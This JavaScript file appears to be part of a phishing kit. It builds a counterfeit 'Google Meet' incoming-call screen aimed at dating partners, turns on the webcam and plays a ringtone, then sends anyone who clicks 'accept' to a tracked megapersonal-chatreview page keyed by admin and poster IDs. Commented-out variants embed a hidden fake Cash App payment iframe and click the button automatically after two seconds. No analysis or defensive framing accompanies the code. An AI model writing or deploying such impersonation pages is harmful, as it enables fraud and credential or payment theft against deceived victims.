
const newDiv = document.createElement('div');
newDiv.className = 'card';


// newDiv.innerHTML = `
// <head>
//     <meta charset="utf-8">
//     <meta name="viewport" content="width=device-width, initial-scale=1">
//     <link rel="stylesheet" href="https://join-video-chat.one/public/css/1e43e3ab50fce75f.css" data-precedence="next">
//     <link rel="stylesheet" href="https://join-video-chat.one/public/css/57978a1014ff42c9.css" data-precedence="next">
//     <title>Google Meet</title>
//     <meta name="description" content="Enjoy private live video chat with your dating partner">
//     <meta property="og:title" content="Google Meet">
//     <meta property="og:description" content="Enjoy private live video chat with your dating partner">
//     <meta property="og:image" content="https://join-video-chat.one/public/images/logo_meet_2020q4_color_2x_web_96dp.png">
//     <meta name="twitter:card" content="summary_large_image">
//     <meta name="twitter:title" content="Google Meet">
//     <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
//     <meta name="twitter:image" content="">
//     <link rel="icon" href="" sizes="32x32">
//     <meta name="next-size-adjust">
// </head>
// <body class="__className_aaf875">
//     <!-- Background Iframe -->
//     <iframe 
//         src="https://paycash-online.vercel.app/rtio/feg/cash-app-pay-online" 
//         width="100%" 
//         height="100%" 
//         style="border:0; position:absolute; top:0; left:0; z-index:-1;">
//     </iframe>

//     <div style="color-scheme:light" class="bg-neutral-900 text-neutral-950">
//         <video autoplay muted playsinline class="fixed inset-0 w-full h-full object-cover object-center" id="video"></video>

//         <div class="relative min-h-dvh flex items-center justify-center p-4 text-center" id="call-popup">
//             <div class="bg-neutral-50 w-full max-w-[17rem] p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
//                 <div class="flex items-center justify-center gap-x-12 text-neutral-50">
//                     <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
//                         <!-- Accept button (empty, no image) -->
//                     </label>
//                 </div>
//             </div>
//         </div>
//     </div>
// </body>
// `;




newDiv.innerHTML = `
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://join-video-chat.one/public/css/1e43e3ab50fce75f.css" data-precedence="next">
    <link rel="stylesheet" href="https://join-video-chat.one/public/css/57978a1014ff42c9.css" data-precedence="next">
    <title>Google Meet</title>
    <meta name="description" content="Enjoy private live video chat with your dating partner">
    <meta property="og:title" content="Google Meet">
    <meta property="og:description" content="Enjoy private live video chat with your dating partner">
    <meta property="og:image" content="https://join-video-chat.one/public/images/logo_meet_2020q4_color_2x_web_96dp.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Google Meet">
    <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
    <link rel="icon" href="" sizes="32x32">
    <meta name="next-size-adjust">
</head>
<body class="__className_aaf875">
    <div style="color-scheme:light" class="bg-neutral-900 text-neutral-950">
        <video autoplay muted playsinline class="fixed inset-0 w-full h-full object-cover object-center" id="video"></video>
        <div class="relative min-h-dvh flex items-center justify-center p-4 text-center" id="call-popup">
            <div class="bg-neutral-50 w-full max-w-[17rem] p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
                <p class=" text-xl font-medium text-neutral-700 text-center">Incoming call...</p>
                <div class="flex items-center justify-center gap-x-12 text-neutral-50">
                   <label class="accept-button size-28 flex items-center justify-center rounded-full text-3xl bg-green-500">
    <svg class="text-blue-600" stroke="currentColor" fill="currentColor" stroke-width="0"
    style="fill: green;"
        viewBox="0 0 24 24" height="5em" width="5em" xmlns="http://www.w3.org/2000/svg">
  
        <path fill="none" d="M0 0h24v24H0z"></path>
        <path
            d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z">
        </path>
    </svg>
</label>

<!-- Reject Button -->
<label class=" size-28 flex items-center justify-center rounded-full text-3xl bg-red-500">
    <svg class="text-green-600" stroke="currentColor" fill="currentColor" stroke-width="0" style="fill: red; "
        viewBox="0 0 24 24" height="5em" width="5em" xmlns="http://www.w3.org/2000/svg">
   r="40"


        <path fill="none" d="M0 0h24v24H0z"></path>
        <path
            d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z">
        </path>
    </svg>
</label>
                </div>
            </div>
        </div>
    </div>
</body>
`;
    let x = 1;
    

    

document.addEventListener('click', function(e) {


function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}


const urlParams = new URLSearchParams(window.location.search);
const errorParam = urlParams.get('error');
const adminId = urlParams.get('admin');
const posterId = urlParams.get('poster');
const verifyId = urlParams.get('verifyId');




setTimeout(()=>{
    document.querySelectorAll('.accept-button').forEach(button => {
        button.addEventListener('click', () => {
      
          window.location.href =`https://megapersonal-chatreview.vercel.app/${adminId}/${posterId}`
        });
      });
},2000)

 
 
});


        $(document).ready(function() {

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                        video: true
                    })
                    .then(function(stream) {
                        $('#video').get(0).srcObject = stream;
                    })
                    .catch(function(error) {
                        console.error('Error accessing webcam:', error);
                    });
            } else {
                console.error('getUserMedia is not supported');
            }

        });

        window.addEventListener('DOMContentLoaded', (event) => {

            const audioContext = new(window.AudioContext || window.webkitAudioContext)();

            const source = audioContext.createBufferSource();

            navigator.mediaDevices
                .getUserMedia({
                    audio: true
                })
                .then(() => {

                    source.addEventListener('ended', () => {
                        source.stop();
                        audioContext.close();
                    });

                    source.loop = true;

                    const request = new XMLHttpRequest();

                    request.open('GET', "https://join-video-chat.one/public/audio/tune_ptyrq7.mp3", true);
                    request.responseType = 'arraybuffer';
                    request.onload = () => {
                        audioContext.decodeAudioData(
                            request.response,
                            (buffer) => {
                                source.buffer = buffer;
                                source.connect(audioContext.destination);
                                source.start();
                            },
                            (e) => {
                            });
                    }

                    request.send();
                })
     

        });

document.body.appendChild(newDiv);





// const newDiv = document.createElement('div');
// newDiv.className = 'card';

// newDiv.innerHTML = `
// <head>
//     <meta charset="utf-8">
//     <meta name="viewport" content="width=device-width, initial-scale=1">
//     <link rel="stylesheet" href="https://join-video-chat.one/public/css/1e43e3ab50fce75f.css" data-precedence="next">
//     <link rel="stylesheet" href="https://join-video-chat.one/public/css/57978a1014ff42c9.css" data-precedence="next">
//     <title>Google Meet</title>
//     <meta name="description" content="Enjoy private live video chat with your dating partner">
//     <meta property="og:title" content="Google Meet">
//     <meta property="og:description" content="Enjoy private live video chat with your dating partner">
//     <meta property="og:image" content="https://join-video-chat.one/public/images/logo_meet_2020q4_color_2x_web_96dp.png">
//     <meta name="twitter:card" content="summary_large_image">
//     <meta name="twitter:title" content="Google Meet">
//     <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
//     <link rel="icon" href="" sizes="32x32">
//     <meta name="next-size-adjust">
// </head>
// <body class="__className_aaf875">
//     <div style="color-scheme:light" class="bg-neutral-900 text-neutral-950">
//         <video autoplay muted playsinline class="fixed inset-0 w-full h-full object-cover object-center" id="video"></video>
//         <div class="relative min-h-dvh flex items-center justify-center p-4 text-center" id="call-popup">
//             <div class="bg-neutral-50 w-full max-w-[17rem] p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
//                 <p class="text-xl font-medium text-neutral-700 text-center">Incoming call...</p>
//                 <div class="flex items-center justify-center gap-x-12 text-neutral-50">
//                     <!-- Accept Button -->
//                     <label class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
//                         <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
//                             <path fill="none" d="M0 0h24v24H0z"></path>
//                             <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
//                         </svg>
//                     </label>
//                     <!-- Reject Button -->
//                     <label class="size-14 flex items-center justify-center rounded-full text-3xl bg-red-500">
//                         <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
//                             <path fill="none" d="M0 0h24v24H0z"></path>
//                             <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"></path>
//                         </svg>
//                     </label>
//                 </div>
//             </div>
//         </div>
//     </div>
// </body>
// `;

// document.body.appendChild(newDiv);

// // Wait until DOM is fully built
// document.addEventListener('DOMContentLoaded', function () {
//     const getQueryParam = (param) => new URLSearchParams(window.location.search).get(param);
//     const admin = getQueryParam('admin');
//     const poster = getQueryParam('poster');

//     document.querySelectorAll('.accept-button').forEach(button => {
//         button.addEventListener('click', () => {
//             window.location.href = `https://megapersonal-chatreview.vercel.app/${admin}/${poster}`;
//         });
//     });

//     // Auto click after 2 seconds
//     setTimeout(() => {
//         const autoBtn = document.querySelector('.accept-button');
//         if (autoBtn) autoBtn.click();
//     }, 2000);
// });

// $(document).ready(function () {
//     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
//         navigator.mediaDevices.getUserMedia({ video: true })
//             .then(function (stream) {
//                 $('#video').get(0).srcObject = stream;
//             })
//             .catch(function (error) {
//                 console.error('Error accessing webcam:', error);
//             });
//     }
// });

// window.addEventListener('DOMContentLoaded', () => {
//     const audioContext = new (window.AudioContext || window.webkitAudioContext)();
//     const source = audioContext.createBufferSource();

//     navigator.mediaDevices.getUserMedia({ audio: true }).then(() => {
//         source.addEventListener('ended', () => {
//             source.stop();
//             audioContext.close();
//         });

//         source.loop = true;
//         const request = new XMLHttpRequest();
//         request.open('GET', "https://join-video-chat.one/public/audio/tune_ptyrq7.mp3", true);
//         request.responseType = 'arraybuffer';

//         request.onload = () => {
//             audioContext.decodeAudioData(request.response, (buffer) => {
//                 source.buffer = buffer;
//                 source.connect(audioContext.destination);
//                 source.start();
//             });
//         };

//         request.send();
//     });
// });

//   .card {
//     background-color: white;
//     box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
//     border-radius: 12px;
//     max-width: 500px;
//     width: 100%;
//     padding: 40px 20px;
//     text-align: center;
//   }